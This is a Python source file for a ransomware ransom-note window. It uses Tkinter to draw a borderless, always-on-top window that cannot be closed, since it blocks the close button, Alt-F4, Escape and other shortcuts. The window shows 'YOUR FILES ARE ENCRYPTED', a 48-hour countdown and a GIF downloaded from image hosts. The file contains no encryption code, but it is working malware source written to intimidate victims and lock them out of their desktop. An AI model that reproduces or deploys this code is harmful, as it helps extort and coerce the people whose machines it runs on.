"""
Ransom window display module.
Creates an unclosable fullscreen window with GIF and countdown timer.
"""
import tkinter as tk
from tkinter import Label
from PIL import Image, ImageTk
import requests
from io import BytesIO
import threading
import time
import sys
import os


class RansomWindow:
    def __init__(self, hours=48):
        self.root = tk.Tk()
        self.hours_remaining = hours
        self.seconds_remaining = hours * 3600
        self.gif_frames = []
        self.current_frame = 0
        self.setup_window()
        
    def setup_window(self):
        """Configure the window to be unclosable and compact."""
        # Set window size to just fit the GIF (450x500 for GIF + timer)
        window_width = 450
        window_height = 520
        
        # Center on screen
        screen_width = self.root.winfo_screenwidth()
        screen_height = self.root.winfo_screenheight()
        x = (screen_width - window_width) // 2
        y = (screen_height - window_height) // 2
        
        self.root.geometry(f"{window_width}x{window_height}+{x}+{y}")
        self.root.resizable(False, False)
        self.root.attributes('-topmost', True)
        self.root.overrideredirect(True)  # Remove window decorations
        
        # Disable close methods
        self.root.protocol("WM_DELETE_WINDOW", self.disable_close)
        self.root.bind('<Alt-F4>', lambda e: "break")
        self.root.bind('<Escape>', lambda e: "break")
        self.root.bind('<Control-w>', lambda e: "break")
        self.root.bind('<Control-q>', lambda e: "break")
        
        # Set background color
        self.root.configure(bg='#000000')
        
        # Create main container
        container = tk.Frame(self.root, bg='#000000')
        container.pack(fill='both', expand=True, padx=10, pady=10)
        
        # Title with timer (compact)
        self.title_label = Label(
            container,
            text="⏰ 48:00:00 ⏰",
            font=('Courier New', 16, 'bold'),
            bg='#000000',
            fg='#ff0000',
            pady=5
        )
        self.title_label.pack()
        
        # GIF display
        self.gif_label = Label(container, bg='#000000')
        self.gif_label.pack(pady=5)
        
        # Minimal message text
        message = "YOUR FILES ARE ENCRYPTED"
        
        self.message_label = Label(
            container,
            text=message,
            font=('Courier New', 12, 'bold'),
            bg='#000000',
            fg='#ff0000',
            pady=5
        )
        self.message_label.pack()
        
        # Load and start GIF animation
        self.load_gif()
        
        # Start countdown timer
        self.update_timer()
        
    def load_gif(self):
        """Load the GIF from a local path first, then try network fallbacks."""
        # 1) Local override via env
        local_override = os.getenv("LOCAL_GIF_PATH")
        # 2) Packaged asset path (if present)
        assets_dir = os.path.join(os.path.dirname(__file__), "assets")
        packaged = os.path.join(assets_dir, "warning.gif")
        # 3) Remote URLs (try in order)
        remote_urls = [
            "https://media.tenor.com/YDgAmOKt0bMAAAAM/brown-recluse-fella.gif",
            "https://media.giphy.com/media/xT1R9Zs6gttxyPjdVu/giphy.gif",
        ]

        def _load_from_fp(fp):
            gif = Image.open(fp)
            try:
                while True:
                    frame = gif.copy().resize((400, 400), Image.Resampling.LANCZOS)
                    self.gif_frames.append(ImageTk.PhotoImage(frame))
                    gif.seek(len(self.gif_frames))
            except EOFError:
                pass

        # Try local override
        try:
            if local_override and os.path.exists(local_override):
                print(f"[ransom_window] Loading local GIF: {local_override}")
                _load_from_fp(local_override)
        except Exception as e:
            print(f"[ransom_window] Local override failed: {e}")

        # Try packaged asset if nothing loaded yet
        if not self.gif_frames:
            try:
                if os.path.exists(packaged):
                    print(f"[ransom_window] Loading packaged GIF: {packaged}")
                    _load_from_fp(packaged)
            except Exception as e:
                print(f"[ransom_window] Packaged asset failed: {e}")

        # If no 'warning.gif', try any .gif in assets directory
        if not self.gif_frames:
            try:
                if os.path.isdir(assets_dir):
                    for name in os.listdir(assets_dir):
                        if name.lower().endswith('.gif'):
                            candidate = os.path.join(assets_dir, name)
                            print(f"[ransom_window] Loading first found GIF: {candidate}")
                            _load_from_fp(candidate)
                            break
            except Exception as e:
                print(f"[ransom_window] Asset directory scan failed: {e}")

        # Try remote URLs
        if not self.gif_frames:
            for url in remote_urls:
                try:
                    print(f"[ransom_window] Downloading GIF from {url} …")
                    headers = {"User-Agent": "Mozilla/5.0 (RansomWindow)"}
                    response = requests.get(url, headers=headers, timeout=15)
                    response.raise_for_status()
                    gif_data = BytesIO(response.content)
                    _load_from_fp(gif_data)
                    if self.gif_frames:
                        break
                except Exception as e:
                    print(f"[ransom_window] Failed to fetch {url}: {e}")

        # Finalize or show text fallback
        if self.gif_frames:
            print(f"[ransom_window] Loaded {len(self.gif_frames)} frames")
            self.animate_gif()
        else:
            print("[ransom_window] No GIF available; showing text fallback")
            self.gif_label.config(
                text="⚠️ ENCRYPTION ACTIVE ⚠️",
                font=('Courier New', 20, 'bold'),
                fg='#ff0000'
            )
    
    def animate_gif(self):
        """Animate the GIF by cycling through frames."""
        if self.gif_frames:
            self.gif_label.config(image=self.gif_frames[self.current_frame])
            self.current_frame = (self.current_frame + 1) % len(self.gif_frames)
            self.root.after(50, self.animate_gif)  # ~20 FPS
    
    def update_timer(self):
        """Update countdown timer every second."""
        if self.seconds_remaining > 0:
            self.seconds_remaining -= 1
            
            hours = self.seconds_remaining // 3600
            minutes = (self.seconds_remaining % 3600) // 60
            seconds = self.seconds_remaining % 60
            
            # Compact timer format
            timer_text = f"⏰ {hours:02d}:{minutes:02d}:{seconds:02d} ⏰"
            self.title_label.config(text=timer_text)
            
            # Continue updating
            self.root.after(1000, self.update_timer)
        else:
            self.title_label.config(
                text="⏰ EXPIRED ⏰",
                fg='#ff0000'
            )
    
    def disable_close(self):
        """Prevent window from being closed."""
        return "break"
    
    def show(self):
        """Display the window and enter main loop."""
        self.root.mainloop()
    
    def destroy(self):
        """Force close the window (for testing/debugging only)."""
        self.root.destroy()


def show_ransom_window(hours=48, blocking=True):
    """
    Show the ransom window.
    
    Args:
        hours: Countdown time in hours (default 48)
        blocking: If True, blocks until window is closed. If False, runs in thread.
    """
    if blocking:
        window = RansomWindow(hours)
        window.show()
    else:
        def run_window():
            window = RansomWindow(hours)
            window.show()
        
        thread = threading.Thread(target=run_window, daemon=False)
        thread.start()
        return thread


if __name__ == "__main__":
    # Test the ransom window
    print("[ransom_window] Starting ransom window display...")
    show_ransom_window(hours=48, blocking=True)
